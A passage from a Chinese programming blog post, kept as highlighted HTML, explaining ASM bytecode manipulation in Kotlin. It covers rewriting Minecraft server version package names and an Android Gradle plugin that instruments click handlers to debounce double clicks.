class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>完整代码如下:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classVisitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> classVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> FieldVisitor <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">></span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span>fieldVisitor<span class=\"token operator\">:</span> FieldVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">FieldVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> fieldVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">val</span> nms <span class=\"token operator\">=</span> <span class=\"token string\">\"net/minecraft/server/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> obc <span class=\"token operator\">=</span> <span class=\"token string\">\"org/bukkit/craftbukkit/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>version<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>nms<span class=\"token punctuation\">,</span> <span class=\"token string\">\"net/minecraft/server/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>obc<span class=\"token punctuation\">,</span> <span class=\"token string\">\"org/bukkit/craftbukkit/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">></span> <span class=\"token function\">createProxyClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> VersionControlClassVisitor<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">getResourceAsStream</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">,</span> <span class=\"token string\">\"v1_16_R3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> MyClassLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">,</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">></span> <span class=\"token function\">createProxyInstance</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> createProxyClass<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> proxy <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    proxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面这段代码的运行结果是<code>execute successfully v1.16</code>,证明我们成功替换了代理类中的包名。</p>\n<p>其实gradle插件shadowJar重定向(relocate)包名的功能的实现也大同小异，大家有兴趣可以课下自己去实现一下。</p>\n<h5 id=\"字节码插桩\"><a href=\"#字节码插桩\" class=\"headerlink\" title=\"字节码插桩\"></a>字节码插桩</h5><p>前面几个其实并不是我们安卓开发经常遇到的问题，只是它们解决起来相对简单。安卓开发中asm框架主要是用来字节码插桩的。</p>\n<p>字节码插桩其实是hook的一种。</p>\n<p>这个我们就不自己写了，我们分析一下大佬写的案例——用字节码插桩实现双击防抖。</p>\n<p>先贴下源码链接: <a href=\"https://github.com/leavesCZY/ASM_Transform\">leavesCZY&#x2F;ASM_Transform: ASM Transform 字节码插桩实战 (github.com)</a></p>\n<p>谷歌为android量身定制了安卓字节码插桩的解决方案<code>transform api</code>来配合gradle使用，<em><strong>不过它现在已经即将废弃了，最新的解决方案是Gradle提供的TransformAction</strong></em>，不过这里我们要看的源码仍然是使用transform api来实现字节码插桩，不过问题不大。</p>\n<h6 id=\"gradle插件编写\"><a href=\"#gradle插件编写\" class=\"headerlink\" title=\"gradle插件编写\"></a>gradle插件编写</h6><blockquote>\n<p>字节码插桩一般都是通过自定义gradle插件干预编译实现的</p>\n<p>准确来说是在编译后再对编译产物处理一遍</p>\n</blockquote>\n<p>首先我们新建一个<code>buildSrc</code>模块，<code>buildSrc</code>模块中的代码可以在其他模块的build.gradle中直接引入使用。</p>\n<p>然后创建一个插件类</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */</span>\n<span class=\"token keyword\">class</span> DoubleClickPlugin <span class=\"token operator\">:</span> Plugin<span class=\"token operator\">&lt;</span>Project<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>project<span class=\"token operator\">:</span> Project<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> config <span class=\"token operator\">=</span> <span class=\"token function\">DoubleClickConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> appExtension<span class=\"token operator\">:</span> AppExtension <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>extensions<span class=\"token punctuation\">.</span><span class=\"token function\">getByType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        appExtension<span class=\"token punctuation\">.</span><span class=\"token function\">registerTransform</span><span class=\"token punctuation\">(</span><span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>其中apply是在你导入这个插件时执行的逻辑，我们在apply方法中注册了我们写的Transform，在编译时便会执行Transform的对应逻辑。</p>\n<p>然后我们只需要在需要使用这个插件的模块导入并apply就可以了</p>\n<pre class=\"line-numbers language-groovy\" data-language=\"groovy\"><code class=\"language-groovy\"><span class=\"token keyword\">import</span> github<span class=\"token punctuation\">.</span>leavesczy<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span>doubleClick<span class=\"token punctuation\">.</span>DoubleClickPlugin\n\napply plugin<span class=\"token punctuation\">:</span> DoubleClickPlugin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"transform逻辑\"><a href=\"#transform逻辑\" class=\"headerlink\" title=\"transform逻辑\"></a>transform逻辑</h6><p>我们先来看看<code>DoubleClickTransform</code>中的内容</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">BaseTransform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ViewDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"Landroid/view/View;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OnClickViewMethodDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"(Landroid/view/View;)V\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ButterKnifeOnClickAnnotationDesc <span class=\"token operator\">=</span> <span class=\"token string\">\"Lbutterknife/OnClick;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> MethodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token operator\">:</span> Boolean\n            <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> desc <span class=\"token operator\">==</span> OnClickViewMethodDescriptor\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatCheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatUncheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>ButterKnifeOnClickAnnotationDesc<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">modifyClass</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ByteArray <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span>EXPAND_FRAMES<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> methods <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> shouldHookMethodList <span class=\"token operator\">=</span> mutableSetOf<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">//静态、包含 UncheckViewOnClick 注解的方法不用处理</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>isStatic <span class=\"token operator\">||</span>\n                    methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token comment\">//添加了 CheckViewOnClick 注解的情况</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token comment\">//使用了 ButterKnife，且当前 method 添加了 OnClick 注解</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> methodNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token comment\">//判断方法内部是否有需要处理的 lambda 表达式</span>\n                <span class=\"token keyword\">val</span> invokeDynamicInsnNodes <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                invokeDynamicInsnNodes<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">val</span> handle <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>bsmArgs<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span><span class=\"token operator\">?</span> Handle\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>handle <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> handle<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">for</span> 